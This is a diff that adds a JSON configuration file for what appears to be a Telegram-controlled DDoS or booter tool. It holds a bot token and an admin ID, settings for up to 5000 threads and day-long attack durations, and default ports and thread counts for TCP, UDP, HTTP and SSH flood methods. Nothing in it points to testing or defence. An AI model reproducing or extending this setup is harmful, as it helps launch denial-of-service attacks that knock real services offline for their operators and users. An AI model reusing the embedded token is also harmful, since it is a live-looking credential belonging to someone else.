@@ -1,0 +1,14 @@
+{
+  "bot_token": "8513023259:AAFvsQ8p-Uw6vO0-4-o21_IWX8SDfib0m70",
+  "admin_id": "7197301814",
+  "max_threads": 5000,
+  "max_duration": 86400,
+  "proxy_enabled": true,
+  "auto_update": true,
+  "attack_methods": {
+    "tcp": {"default_port": 80, "default_threads": 1000},
+    "udp": {"default_port": 53, "default_threads": 500},
+    "http": {"default_port": 80, "default_threads": 2000},
+    "ssh": {"default_port": 22, "default_threads": 100}
+  }
+}
